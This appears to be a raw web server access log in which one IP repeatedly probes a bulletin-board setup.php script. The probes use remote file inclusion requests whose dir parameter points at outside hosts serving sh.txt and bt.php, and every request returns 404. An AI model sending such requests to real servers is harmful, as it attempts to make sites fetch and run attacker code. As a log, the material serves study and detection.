176.31.252.38 - - [19/Feb/2015:16:23:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:23:52 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:23:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:23:54 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:24:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:24:02 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:24:02 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:24:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:25:14 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:16 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:16 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:17 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:27 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:28 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:29 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
